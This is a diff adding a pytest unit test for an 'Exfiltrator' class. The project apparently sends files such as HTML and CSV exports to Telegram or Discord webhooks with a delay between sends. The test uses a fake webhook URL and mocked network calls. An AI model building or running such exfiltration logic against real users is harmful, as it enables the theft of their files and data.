@@ -40,3 +40,21 @@ def test_exfiltrator_missing_creds():
     exf = Exfiltrator()
     assert exf.send_to_telegram("path") is False
     assert exf.send_to_discord("path") is False
+
+def test_send_files(mocker):
+    """Test send_files logic and inter-file delay."""
+    exf = Exfiltrator(discord_webhook="https://discord.com/api/webhooks/fake")
+    
+    mocker.patch("requests.post", return_value=MagicMock(status_code=204))
+    mocker.patch("builtins.open", mocker.mock_open(read_data=b"content"))
+    
+    # Mock time.sleep to avoid waiting during tests
+    mock_sleep = mocker.patch("time.sleep")
+    
+    # Send two files to trigger the delay between them
+    exf.send_files(["file1.html", "file2.csv"])
+    
+    # Check that sleep was called if send_delay > 0
+    from main import CONFIG
+    if CONFIG["send_delay"] > 0:
+        mock_sleep.assert_called_with(CONFIG["send_delay"])
